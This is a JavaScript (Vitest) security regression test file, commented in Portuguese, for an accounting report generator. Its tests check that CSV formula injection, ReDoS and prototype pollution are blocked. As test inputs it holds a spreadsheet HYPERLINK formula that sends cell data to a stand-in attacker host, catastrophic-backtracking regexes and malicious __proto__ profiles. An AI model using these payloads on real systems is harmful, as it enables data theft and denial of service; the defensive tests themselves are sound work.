import { describe, expect, it } from "vitest";
import { neutralizarFormula } from "../exportacao.js";
import { grupoPorPlano, lerPlano, padraoSeguro } from "../planoPerfil.js";
import { lerPerfil } from "../perfil.js";

/* Testes dos vetores encontrados na auditoria de segurança.
 * Cada um corresponde a um problema real que existia e foi corrigido —
 * estão aqui para não voltarem sem alguém perceber. */

describe("injeção de fórmula no CSV", () => {
  it("neutraliza os caracteres que o Excel avalia como fórmula", () => {
    // Excel e LibreOffice avaliam célula que comece com = + - @ tab CR.
    // Uma descrição de conta com =HYPERLINK vira link que vaza dados da
    // planilha; =cmd|... chega a executar comando no Windows.
    for (const inicio of ["=", "+", "-", "@", "\t", "\r"]) {
      expect(neutralizarFormula(`${inicio}ALGO`)).toBe(`'${inicio}ALGO`);
    }
  });

  it("preserva texto contábil normal, sem prefixo espúrio", () => {
    expect(neutralizarFormula("(-)BOLSAS ESTUDANTIS")).toBe("(-)BOLSAS ESTUDANTIS");
    expect(neutralizarFormula("RECEITAS PROPRIAS")).toBe("RECEITAS PROPRIAS");
    expect(neutralizarFormula("1.234,56")).toBe("1.234,56");
    expect(neutralizarFormula("")).toBe("");
  });

  it("neutraliza o ataque concreto de exfiltração", () => {
    const ataque = '=HYPERLINK("http://evil.tld?d="&A1,"clique")';
    expect(neutralizarFormula(ataque).startsWith("'=")).toBe(true);
  });
});

describe("ReDoS via perfil de plano de contas", () => {
  it("recusa quantificador aninhado, a construção que causa o travamento", () => {
    // (a+)+$ contra 30 caracteres leva mais de 30 segundos. No navegador
    // congela a aba de vez: não há como interromper regex em andamento.
    expect(padraoSeguro("(a+)+$")).toBe(false);
    expect(padraoSeguro("(x*)*")).toBe(false);
    expect(padraoSeguro("(a{2,}){3,}")).toBe(false);
  });

  it("aceita os padrões legítimos deste projeto", () => {
    expect(padraoSeguro("PROUNI")).toBe(true);
    expect(padraoSeguro("IPTU|IMOVEL")).toBe(true);
    expect(padraoSeguro("\\bPIS\\b")).toBe(true);
  });

  it("recusa padrão absurdamente longo e regex inválida", () => {
    expect(padraoSeguro("a".repeat(200))).toBe(false);
    expect(padraoSeguro("([")).toBe(false);
    expect(padraoSeguro("")).toBe(false);
  });

  it("descarta a regra perigosa em vez de travar ao carregar o perfil", () => {
    const r = lerPlano(JSON.stringify({
      formato: "gerador-dre/plano", versao: 1, nome: "malicioso",
      assinatura: { "3": "RECEITA" }, codigos: {},
      regras: [
        { tipo: "nome", prefixo: "3", padrao: "(a+)+$", grupo: "CUSTOS" },
        { tipo: "nome", prefixo: "3", padrao: "PROUNI", grupo: "DED_PROUNI" },
      ],
    }));
    expect(r.ok).toBe(true);
    expect(r.plano.regras).toHaveLength(1);
    expect(r.plano.regras[0].padrao).toBe("PROUNI");
    expect(r.regrasRecusadas).toBe(1);
  });

  it("um perfil malicioso não trava a classificação", () => {
    const r = lerPlano(JSON.stringify({
      formato: "gerador-dre/plano", versao: 1,
      assinatura: { "3": "RECEITA" }, codigos: { "3": "REC_TAXAS" },
      regras: [{ tipo: "nome", prefixo: "3", padrao: "(a+)+$", grupo: "CUSTOS" }],
    }));
    const inicio = Date.now();
    // Sem a validação, esta linha sozinha congelaria o processo.
    grupoPorPlano(r.plano, "3110101", { "3110101": "a".repeat(40) + "!" }, 100);
    expect(Date.now() - inicio).toBeLessThan(1000);
  });
});

describe("prototype pollution nos perfis carregados", () => {
  it("não polui Object.prototype por chave __proto__", () => {
    lerPerfil(JSON.stringify({
      formato: "gerador-dre/perfil", versao: 1,
      contas: { __proto__: "CUSTOS", "1": "CUSTOS" },
      nomes: { __proto__: { poluido: true } },
    }));
    expect({}.poluido).toBeUndefined();
    expect({}.CUSTOS).toBeUndefined();
  });

  it("não polui por perfil de plano de contas", () => {
    lerPlano(JSON.stringify({
      formato: "gerador-dre/plano", versao: 1,
      assinatura: { "3": "RECEITA" },
      codigos: { __proto__: "CUSTOS", constructor: "CUSTOS", "3": "CUSTOS" },
    }));
    expect({}.poluido).toBeUndefined();
  });
});
